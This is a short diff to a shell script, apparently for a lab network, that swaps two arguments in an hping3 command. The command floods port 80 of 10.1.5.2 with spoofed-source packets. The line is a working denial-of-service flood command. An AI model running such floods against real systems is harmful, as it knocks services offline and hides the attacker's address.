@@ -11,7 +11,7 @@ then
     if [ "$1" ] && [ "$2" ]
     then
         echo "START SPOOFED SOURCE"
-        sudo hping3 -$2 --flood --destport 80 -a $1 10.1.5.2 > /dev/null
+        sudo hping3 -$1 --flood --destport 80 -a $2 10.1.5.2 > /dev/null
     fi
 
 elif [ $# == 1 ]
